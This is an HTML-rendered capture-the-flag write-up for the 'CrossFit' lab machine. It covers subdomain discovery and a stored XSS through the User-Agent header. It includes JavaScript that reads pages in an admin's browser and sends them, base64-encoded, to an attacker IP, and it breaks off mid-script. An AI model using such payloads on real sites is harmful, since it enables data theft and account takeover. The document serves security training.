@@ -1,0 +1,491 @@
+<html>
+<head><meta http-equiv=Content-Type content="text/html; charset=UTF-8">
+<style type="text/css">
+<!--
+span.cls_002{font-family:Arial,serif;font-size:25.5px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+div.cls_002{font-family:Arial,serif;font-size:25.5px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+span.cls_003{font-family:Arial,serif;font-size:19.6px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+div.cls_003{font-family:Arial,serif;font-size:19.6px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+span.cls_004{font-family:Arial,serif;font-size:19.6px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_004{font-family:Arial,serif;font-size:19.6px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_005{font-family:Arial,serif;font-size:12.0px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_005{font-family:Arial,serif;font-size:12.0px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_006{font-family:Arial,serif;font-size:12.0px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_006{font-family:Arial,serif;font-size:12.0px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_028{font-family:Arial,serif;font-size:12.0px;color:rgb(221,162,12);font-weight:normal;font-style:normal;text-decoration: underline}
+div.cls_028{font-family:Arial,serif;font-size:12.0px;color:rgb(221,162,12);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_008{font-family:Arial,serif;font-size:16.6px;color:rgb(0,0,0);font-weight:bold;font-style:italic;text-decoration: none}
+div.cls_008{font-family:Arial,serif;font-size:16.6px;color:rgb(0,0,0);font-weight:bold;font-style:italic;text-decoration: none}
+span.cls_009{font-family:Arial,serif;font-size:16.6px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+div.cls_009{font-family:Arial,serif;font-size:16.6px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+span.cls_010{font-family:Arial,serif;font-size:15.0px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+div.cls_010{font-family:Arial,serif;font-size:15.0px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+span.cls_011{font-family:Arial,serif;font-size:15.0px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_011{font-family:Arial,serif;font-size:15.0px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_012{font-family:Arial,serif;font-size:12.0px;color:rgb(0,0,0);font-weight:bold;font-style:italic;text-decoration: none}
+div.cls_012{font-family:Arial,serif;font-size:12.0px;color:rgb(0,0,0);font-weight:bold;font-style:italic;text-decoration: none}
+span.cls_013{font-family:Arial,serif;font-size:12.0px;color:rgb(0,0,0);font-weight:normal;font-style:italic;text-decoration: none}
+div.cls_013{font-family:Arial,serif;font-size:12.0px;color:rgb(0,0,0);font-weight:normal;font-style:italic;text-decoration: none}
+span.cls_014{font-family:Arial,serif;font-size:12.0px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+div.cls_014{font-family:Arial,serif;font-size:12.0px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+span.cls_015{font-family:Arial,serif;font-size:13.5px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+div.cls_015{font-family:Arial,serif;font-size:13.5px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
+span.cls_016{font-family:Courier New,serif;font-size:10.2px;color:rgb(171,77,126);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_016{font-family:Courier New,serif;font-size:10.2px;color:rgb(171,77,126);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_017{font-family:Arial,serif;font-size:15.0px;color:rgb(0,0,0);font-weight:bold;font-style:italic;text-decoration: none}
+div.cls_017{font-family:Arial,serif;font-size:15.0px;color:rgb(0,0,0);font-weight:bold;font-style:italic;text-decoration: none}
+span.cls_019{font-family:Courier New,serif;font-size:10.2px;color:rgb(102,217,239);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_019{font-family:Courier New,serif;font-size:10.2px;color:rgb(102,217,239);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_018{font-family:Courier New,serif;font-size:10.2px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_018{font-family:Courier New,serif;font-size:10.2px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_020{font-family:Courier New,serif;font-size:10.2px;color:rgb(247,247,241);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_020{font-family:Courier New,serif;font-size:10.2px;color:rgb(247,247,241);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_021{font-family:Courier New,serif;font-size:10.2px;color:rgb(166,226,46);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_021{font-family:Courier New,serif;font-size:10.2px;color:rgb(166,226,46);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_022{font-family:Courier New,serif;font-size:10.2px;color:rgb(230,218,115);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_022{font-family:Courier New,serif;font-size:10.2px;color:rgb(230,218,115);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_023{font-family:Courier New,serif;font-size:10.2px;color:rgb(174,129,255);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_023{font-family:Courier New,serif;font-size:10.2px;color:rgb(174,129,255);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_024{font-family:Courier New,serif;font-size:10.2px;color:rgb(111,128,143);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_024{font-family:Courier New,serif;font-size:10.2px;color:rgb(111,128,143);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_025{font-family:Courier New,serif;font-size:10.2px;color:rgb(249,37,114);font-weight:normal;font-style:normal;text-decoration: none}
+div.cls_025{font-family:Courier New,serif;font-size:10.2px;color:rgb(249,37,114);font-weight:normal;font-style:normal;text-decoration: none}
+span.cls_027{font-family:Courier New,serif;font-size:10.2px;color:rgb(253,151,31);font-weight:bold;font-style:normal;text-decoration: none}
+div.cls_027{font-family:Courier New,serif;font-size:10.2px;color:rgb(253,151,31);font-weight:bold;font-style:normal;text-decoration: none}
+-->
+</style>
+<script type="text/javascript" src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/wz_jsgraphics.js"></script>
+</head>
+<body>
+<div style="position:absolute;left:50%;margin-left:-306px;top:0px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background01.jpg" width=612 height=792></div>
+<div style="position:absolute;left:51.50px;top:53.75px" class="cls_002"><span class="cls_002">CROSSFIT | LINUX | INSANE</span></div>
+<div style="position:absolute;left:51.50px;top:102.50px" class="cls_003"><span class="cls_003">BHOSA | 26</span><span class="cls_004"></span><span class="cls_003">03</span><span class="cls_004"></span><span class="cls_003">2021</span></div>
+<div style="position:absolute;left:51.50px;top:143.75px" class="cls_002"><span class="cls_002">ENUMERATION</span></div>
+<div style="position:absolute;left:49.25px;top:194.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> 21-ftp check</span></div>
+<div style="position:absolute;left:49.25px;top:212.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> 22</span><span class="cls_005"></span><span class="cls_006"> ssh</span></div>
+<div style="position:absolute;left:49.25px;top:230.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> 80-web check</span></div>
+<div style="position:absolute;left:49.25px;top:248.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> </span><A HREF="mailto:info@gym-club.crossfit.htb">info@gym-club.crossfit.htb</A> </span></div>
+<div style="position:absolute;left:51.50px;top:282.50px" class="cls_003"><span class="cls_003">gym-club.crossfit.htb</span></div>
+<div style="position:absolute;left:49.25px;top:333.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> /etc/mysql/my.cnf</span></div>
+<div style="position:absolute;left:51.50px;top:392.00px" class="cls_006"><span class="cls_006">This box was a insane box in all aspects.The initial foothold was based on a stored xss on</span></div>
+<div style="position:absolute;left:51.50px;top:410.00px" class="cls_006"><span class="cls_006">admin and then some horizontal privesc to multiple users using some hardcoded</span></div>
+<div style="position:absolute;left:51.50px;top:428.00px" class="cls_006"><span class="cls_006">passwords in some conf files,and also a cron job which included a php file which used a</span></div>
+<div style="position:absolute;left:51.50px;top:446.00px" class="cls_006"><span class="cls_006">bug versioned module which led to another user compromise.The final root privesc was a</span></div>
+<div style="position:absolute;left:51.50px;top:464.00px" class="cls_006"><span class="cls_006">reverse engineering and the wasy to achieve that was also tedious because of some</span></div>
+<div style="position:absolute;left:51.50px;top:482.00px" class="cls_006"><span class="cls_006">cleanup scripts that kept on deleting the files that we needed.</span></div>
+<div style="position:absolute;left:51.50px;top:538.25px" class="cls_003"><span class="cls_003">FTP</span></div>
+<div style="position:absolute;left:63.50px;top:582.50px" class="cls_006"><span class="cls_006">Anonymous login not allowed.</span></div>
+<div style="position:absolute;left:51.50px;top:616.25px" class="cls_003"><span class="cls_003">SSH</span></div>
+<div style="position:absolute;left:63.50px;top:660.50px" class="cls_006"><span class="cls_006">Not a vulnerable version.</span></div>
+<div style="position:absolute;left:51.50px;top:694.25px" class="cls_003"><span class="cls_003">DISCOVERING SUBDOMAIN FROM ftp SSL</span></div>
+<div style="position:absolute;left:51.50px;top:718.25px" class="cls_003"><span class="cls_003">CERTIFICATE.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:802px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background02.jpg" width=612 height=792></div>
+<div style="position:absolute;left:63.50px;top:30.50px" class="cls_006"><span class="cls_006">The initial web page at port 80 was a simple apache web page.</span></div>
+<div style="position:absolute;left:63.50px;top:48.50px" class="cls_006"><span class="cls_006">Sub domain discovered through nmap ftp ssl scan.(ftp different so we need to use</span></div>
+<div style="position:absolute;left:63.50px;top:66.50px" class="cls_006"><span class="cls_006">[lftp] to work with it).</span></div>
+<div style="position:absolute;left:63.50px;top:155.75px" class="cls_006"><span class="cls_006">PAGE AT gym-club.crossfit.htb</span></div>
+<div style="position:absolute;left:51.50px;top:433.25px" class="cls_008"><span class="cls_008">gym-club.crossfit.htb</span></div>
+<div style="position:absolute;left:49.25px;top:473.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> Basic page with no cookies.</span></div>
+<div style="position:absolute;left:49.25px;top:491.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> no login page.</span></div>
+<div style="position:absolute;left:49.25px;top:509.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> bunch of user input endpoints.</span></div>
+<div style="position:absolute;left:51.50px;top:544.25px" class="cls_009"><span class="cls_009">USER ENDPOINTS</span></div>
+<div style="position:absolute;left:51.50px;top:575.75px" class="cls_010"><span class="cls_010">1. INDEX PAGE</span><span class="cls_011"></span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:1604px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background03.jpg" width=612 height=792></div>
+<div style="position:absolute;left:63.50px;top:263.75px" class="cls_006"><span class="cls_006">BASIC CONTACT PAGE</span></div>
+<div style="position:absolute;left:63.50px;top:281.75px" class="cls_006"><span class="cls_006">NO SUCESS MESSAGE</span></div>
+<div style="position:absolute;left:63.50px;top:299.75px" class="cls_006"><span class="cls_006">DEAD</span></div>
+<div style="position:absolute;left:51.50px;top:326.75px" class="cls_010"><span class="cls_010">2. CONTACT PAGE</span><span class="cls_011"></span></div>
+<div style="position:absolute;left:63.50px;top:602.75px" class="cls_006"><span class="cls_006">ANOTHER CONTACT PAGE</span></div>
+<div style="position:absolute;left:63.50px;top:620.75px" class="cls_006"><span class="cls_006">DISPLAYS MESSAGE ON SUCCESS.</span></div>
+<div style="position:absolute;left:63.50px;top:638.75px" class="cls_006"><span class="cls_006">POSSIBLE ENDPOINT.</span></div>
+<div style="position:absolute;left:51.50px;top:665.75px" class="cls_010"><span class="cls_010">3. BLOG</span><span class="cls_011"></span><span class="cls_010">SINGLE PAGE</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:2406px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background04.jpg" width=612 height=792></div>
+<div style="position:absolute;left:63.50px;top:253.25px" class="cls_006"><span class="cls_006">COMMENT PAGE.</span></div>
+<div style="position:absolute;left:63.50px;top:271.25px" class="cls_006"><span class="cls_006">WHEN INCLUDED SCRIPT TAGS AND OTHER BLACKLISTED CHARACTERS.</span></div>
+<div style="position:absolute;left:63.50px;top:289.25px" class="cls_006"><span class="cls_006">ALERT SHOWS UP.</span></div>
+<div style="position:absolute;left:51.50px;top:573.50px" class="cls_010"><span class="cls_010">XSS EXPLOIT</span></div>
+<div style="position:absolute;left:49.25px;top:611.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> A XSS REPORT IS SENT TO THE ADMIN.</span></div>
+<div style="position:absolute;left:49.25px;top:629.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> THE REPORT CONTAINS THE </span><span class="cls_012">IP</span><span class="cls_006"> AND </span><span class="cls_012">BROWSER</span><span class="cls_006"> INFO.</span></div>
+<div style="position:absolute;left:49.25px;top:647.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> IP CANT BE CHANGED BUT THE BROWSER INFO CAN BE CHANGED.</span></div>
+<div style="position:absolute;left:49.25px;top:665.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> THE BROWSER INFO IS TAKEN FROM THE </span><span class="cls_012">USER</span><span class="cls_013"></span><span class="cls_012">AGENT</span><span class="cls_006"> HEADER THAT WE SUPPLY</span></div>
+<div style="position:absolute;left:63.50px;top:683.75px" class="cls_006"><span class="cls_006">IN OUR REQUEST.</span></div>
+<div style="position:absolute;left:49.25px;top:701.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> MOST PROBABLY THERE WILL BE A BOT </span><span class="cls_005"></span><span class="cls_014">selenium</span><span class="cls_006">).</span></div>
+<div style="position:absolute;left:49.25px;top:719.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> </span><span class="cls_012">SO PASS A XSS IN THE USER</span><span class="cls_013"></span><span class="cls_012">AGENT</span><span class="cls_006"> SO THAT IF THE ADMIN USER IS VULNERABLE</span></div>
+<div style="position:absolute;left:63.50px;top:737.75px" class="cls_006"><span class="cls_006">TO XSS THEN THE JAVASCRIPT WILL BE EXECUTED BY THE BROWSER.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:3208px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background05.jpg" width=612 height=792></div>
+<div style="position:absolute;left:73.25px;top:247.25px" class="cls_006"><span class="cls_006">subsequently a request for the file came inidcating that the admin browser opened</span></div>
+<div style="position:absolute;left:73.25px;top:265.25px" class="cls_006"><span class="cls_006">the report and then viewed the report because of which the javascript was</span></div>
+<div style="position:absolute;left:73.25px;top:283.25px" class="cls_006"><span class="cls_006">executed by the browser.</span></div>
+<div style="position:absolute;left:51.50px;top:407.75px" class="cls_010"><span class="cls_010">COOKIE RETRIEVAL FAILURE</span></div>
+<div style="position:absolute;left:49.25px;top:446.00px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> NEXT ATTEMPT WAS TO RETRIEVE SOME COOKIES OF ADMIN.</span></div>
+<div style="position:absolute;left:49.25px;top:695.00px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> BUT THERE WAS NO COOKIE.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:4010px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background06.jpg" width=612 height=792></div>
+<div style="position:absolute;left:51.50px;top:143.00px" class="cls_010"><span class="cls_010">SUBDOMAIN DISCOVERY USING CORS</span></div>
+<div style="position:absolute;left:63.50px;top:174.50px" class="cls_006"><span class="cls_006">CORS  Cross Origin Resource Sharing policies.</span></div>
+<div style="position:absolute;left:63.50px;top:192.50px" class="cls_006"><span class="cls_006">This policy is used to manage cross origin resource sharing between two websites so</span></div>
+<div style="position:absolute;left:63.50px;top:210.50px" class="cls_006"><span class="cls_006">as to reduce hacking risks.</span></div>
+<div style="position:absolute;left:63.50px;top:228.50px" class="cls_006"><span class="cls_006">It was formed after the failure of sop(Same Origin policy) which had a lot of</span></div>
+<div style="position:absolute;left:63.50px;top:246.50px" class="cls_006"><span class="cls_006">restrictions.</span></div>
+<div style="position:absolute;left:63.50px;top:264.50px" class="cls_012"><span class="cls_012">MORE ABOUT CORS</span><span class="cls_013"></span><span class="cls_006"> </span><span class="cls_028">CORS</span></div>
+<div style="position:absolute;left:51.50px;top:292.25px" class="cls_015"><span class="cls_015">FUZZ METHODOLOGY</span></div>
+<div style="position:absolute;left:63.50px;top:323.00px" class="cls_006"><span class="cls_006">The basic idea that we are gonna use in </span><span class="cls_028">CROSSFIT</span><span class="cls_006"> is the following:</span></div>
+<div style="position:absolute;left:49.25px;top:359.00px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> SO WHEN WE SENT A GET REQUEST TO SOME WEBSITE,WE ALSO SENT A </span><span class="cls_012">ORIGIN</span></div>
+<div style="position:absolute;left:63.50px;top:377.00px" class="cls_012"><span class="cls_012">HEADER</span><span class="cls_006"> .</span><span class="cls_012">This is to help the server understand from where the request is coming.</span></div>
+<div style="position:absolute;left:49.25px;top:395.00px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> THE SERVER WEBSITE CHECKS THE ORIGIN AND IF THE WEBSITE IS ALLOWED</span></div>
+<div style="position:absolute;left:63.50px;top:413.00px" class="cls_006"><span class="cls_006">THEN IT SENTS A </span><span class="cls_016">Access-Control-Allow-Origin: <A HREF="http://ftp.crossfit.htb/">http://ftp.crossfit.htb</A> </span><span class="cls_006">  HEADER</span></div>
+<div style="position:absolute;left:63.50px;top:432.50px" class="cls_006"><span class="cls_006">TO SPECIFY THAT THE DOMAIN FROM WHICH THE REQUESTS ARE ORIGINATING</span></div>
+<div style="position:absolute;left:63.50px;top:450.50px" class="cls_006"><span class="cls_006">CAN HAVE ACCESS TO THE RESOURCES IN THE SERVER.</span></div>
+<div style="position:absolute;left:49.25px;top:468.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> </span><span class="cls_012">WHAT IS OUR OBJECTIVE?</span><span class="cls_006">\</span></div>
+<div style="position:absolute;left:49.25px;top:486.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> IT IS TO FIND REAL SUB</span><span class="cls_005"></span><span class="cls_006">DOMAINS SO THAT WE CAN FURTHUR ENUMERATE.</span></div>
+<div style="position:absolute;left:49.25px;top:504.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> AND WE DO THAT WITH THE HELP OF THE RESPONSE HEADER</span><span class="cls_005"></span><span class="cls_016"> Access-Control-</span></div>
+<div style="position:absolute;left:63.50px;top:525.80px" class="cls_016"><span class="cls_016">Allow-Origin:</span></div>
+<div style="position:absolute;left:49.25px;top:543.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> WE USE FFUF TO SEND A GET REQUEST WITH RANDOM SUB</span><span class="cls_005"></span><span class="cls_006">DOMAINS FROMA</span></div>
+<div style="position:absolute;left:63.50px;top:561.50px" class="cls_006"><span class="cls_006">WORDLIST AND THEN FILTER THE RESPONSES ON THE BASIS OF THE HEADER</span></div>
+<div style="position:absolute;left:66.50px;top:579.50px" class="cls_016"><span class="cls_016">Access-Control-Allow-Origin:</span><span class="cls_006">  USINF A </span><span class="cls_012">REGEX OPTION</span><span class="cls_006"> IN FFUF(same can be done</span></div>
+<div style="position:absolute;left:63.50px;top:599.00px" class="cls_006"><span class="cls_006">in wfuzz).</span></div>
+<div style="position:absolute;left:49.25px;top:617.00px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> The servers wont send a </span><span class="cls_016">Access-Control-Allow-Origin:</span><span class="cls_006">  header if the origin is some</span></div>
+<div style="position:absolute;left:63.50px;top:636.50px" class="cls_006"><span class="cls_006">domain or sub-domain that it does not recognize.</span></div>
+<div style="position:absolute;left:63.50px;top:672.50px" class="cls_006"><span class="cls_006">FFUF command:</span></div>
+<div style="position:absolute;left:71.00px;top:708.05px" class="cls_016"><span class="cls_016">ffuf -mr "Access-Control-Allow-Origin:" -w</span></div>
+<div style="position:absolute;left:71.00px;top:726.80px" class="cls_016"><span class="cls_016">/usr/share/dirb/wordlists/common.txt -H "Origin: </span><A HREF="http://fuzz.crossfit.htb"/">http://FUZZ.crossfit.htb"</A> -u</div>
+<div style="position:absolute;left:71.00px;top:745.55px" class="cls_016"><span class="cls_016"> </span><A HREF="http://gym-club.crossfit.htb/">http://gym-club.crossfit.htb/</A> </div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:4812px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background07.jpg" width=612 height=792></div>
+<div style="position:absolute;left:51.50px;top:258.50px" class="cls_009"><span class="cls_009">ftp.crossfit.htb</span></div>
+<div style="position:absolute;left:63.50px;top:292.25px" class="cls_006"><span class="cls_006">This sub-domain only shows apache default page.</span></div>
+<div style="position:absolute;left:63.50px;top:310.25px" class="cls_006"><span class="cls_006">no directories founnd using gobuster.</span></div>
+<div style="position:absolute;left:51.50px;top:533.00px" class="cls_010"><span class="cls_010">USING XSS TO WORK WITH </span><span class="cls_017">ftp.crossfit.htb</span></div>
+<div style="position:absolute;left:49.25px;top:571.25px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> Now we need to access ftp.crossfit.htb via xss.</span></div>
+<div style="position:absolute;left:49.25px;top:589.25px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> We will make sure that using xss we make the admin user </span><span class="cls_014">download a js file</span><span class="cls_006"> and then</span></div>
+<div style="position:absolute;left:63.50px;top:607.25px" class="cls_006"><span class="cls_006">the js file will execute the necessary commands to </span><span class="cls_016">GET</span><span class="cls_006">  the page and then </span><span class="cls_014">store the</span></div>
+<div style="position:absolute;left:63.50px;top:626.75px" class="cls_014"><span class="cls_014">response in a variable </span><span class="cls_006">and the remaining part of the script will ensure to send a</span></div>
+<div style="position:absolute;left:63.50px;top:644.75px" class="cls_006"><span class="cls_006">connection back to our python server along with the response.</span></div>
+<div style="position:absolute;left:49.25px;top:662.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> AND THEN VIEWING THE RESPONSE IN FIREFOX WILL GIVE US AN IDEA OF HOW</span></div>
+<div style="position:absolute;left:63.50px;top:680.75px" class="cls_006"><span class="cls_006">THE WEBPAGE ftp.crossfit.htb looks like in admin browser.</span></div>
+<div style="position:absolute;left:51.50px;top:715.25px" class="cls_009"><span class="cls_009">JAVASCRIPT FILE FOR SIMPLE GET REQUEST.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:5614px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background08.jpg" width=612 height=792></div>
+<div style="position:absolute;left:63.50px;top:45.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">target1 = </span><span class="cls_021">'http://ftp.crossfit.htb/'</span><span class="cls_020">;</span></div>
+<div style="position:absolute;left:63.50px;top:63.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">req3 = </span><span class="cls_019">new</span><span class="cls_020"> </span><span class="cls_022">XMLHttpRequest</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:81.05px" class="cls_020"><span class="cls_020">req3.</span><span class="cls_022">open</span><span class="cls_020">(</span><span class="cls_021">'GET'</span><span class="cls_020">,target1,</span><span class="cls_023">false</span><span class="cls_020">);</span></div>
+<div style="position:absolute;left:63.50px;top:99.05px" class="cls_020"><span class="cls_020">req3.</span><span class="cls_022">send</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:117.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">response =</span><span class="cls_018"> </span><span class="cls_020">req3.responseText;</span></div>
+<div style="position:absolute;left:63.50px;top:153.05px" class="cls_024"><span class="cls_024">/*attacker request*/</span></div>
+<div style="position:absolute;left:63.50px;top:171.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">attacker = </span><span class="cls_021">'http://10.10.14.47/result='</span><span class="cls_020">+</span><span class="cls_022">btoa</span><span class="cls_020">(response);</span></div>
+<div style="position:absolute;left:63.50px;top:189.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">req2 = </span><span class="cls_019">new</span><span class="cls_020"> </span><span class="cls_022">XMLHttpRequest</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:207.05px" class="cls_020"><span class="cls_020">req2.</span><span class="cls_022">open</span><span class="cls_020">(</span><span class="cls_021">'GET'</span><span class="cls_020">,attacker,</span><span class="cls_023">true</span><span class="cls_020">);</span></div>
+<div style="position:absolute;left:63.50px;top:225.05px" class="cls_020"><span class="cls_020">req2.</span><span class="cls_022">send</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:88.25px;top:282.50px" class="cls_016"><span class="cls_016">btoa(response)</span><span class="cls_006">  is used to convert text to base64.</span></div>
+<div style="position:absolute;left:85.25px;top:302.00px" class="cls_006"><span class="cls_006">converting to base64 will help in retrieving all data,it also helps if their are</span></div>
+<div style="position:absolute;left:85.25px;top:320.00px" class="cls_006"><span class="cls_006">some special characters.</span></div>
+<div style="position:absolute;left:51.50px;top:366.50px" class="cls_009"><span class="cls_009">RETRIEVED PAGES</span></div>
+<div style="position:absolute;left:51.50px;top:398.00px" class="cls_010"><span class="cls_010">index.html</span></div>
+<div style="position:absolute;left:51.50px;top:515.00px" class="cls_010"><span class="cls_010">create.html</span></div>
+<div style="position:absolute;left:51.50px;top:661.25px" class="cls_009"><span class="cls_009">POST REQUEST TO CREATE A NEW USER USING XSS</span></div>
+<div style="position:absolute;left:49.25px;top:701.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> We now need to create a new user.</span></div>
+<div style="position:absolute;left:49.25px;top:719.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> Using javascript one can create a POST request also.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:6416px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background09.jpg" width=612 height=792></div>
+<div style="position:absolute;left:63.50px;top:45.05px" class="cls_024"><span class="cls_024">/*GETTING THE TOKEN*/</span></div>
+<div style="position:absolute;left:63.50px;top:63.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">target2 = </span><span class="cls_021">'http://ftp.crossfit.htb/accounts/create'</span><span class="cls_020">;</span></div>
+<div style="position:absolute;left:63.50px;top:81.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">req4 = </span><span class="cls_019">new</span><span class="cls_020"> </span><span class="cls_022">XMLHttpRequest</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:99.05px" class="cls_020"><span class="cls_020">req4.</span><span class="cls_022">open</span><span class="cls_020">(</span><span class="cls_021">'GET'</span><span class="cls_020">,target2,</span><span class="cls_023">false</span><span class="cls_020">); </span><span class="cls_024">/*here</span><span class="cls_018"> </span><span class="cls_024">`false`</span><span class="cls_018"> </span><span class="cls_024">is</span><span class="cls_018"> </span><span class="cls_024">necessary</span><span class="cls_018"> </span><span class="cls_024">so</span><span class="cls_018"> </span><span class="cls_024">that</span><span class="cls_018"> </span><span class="cls_024">only</span><span class="cls_018"> </span><span class="cls_024">after</span></div>
+<div style="position:absolute;left:63.50px;top:117.05px" class="cls_024"><span class="cls_024">this req is completed the program continues*/</span></div>
+<div style="position:absolute;left:63.50px;top:135.05px" class="cls_020"><span class="cls_020">req4.withCredentials = </span><span class="cls_023">true</span><span class="cls_020">;</span></div>
+<div style="position:absolute;left:246.91px;top:135.05px" class="cls_024"><span class="cls_024">/*to keep the session alive*/</span></div>
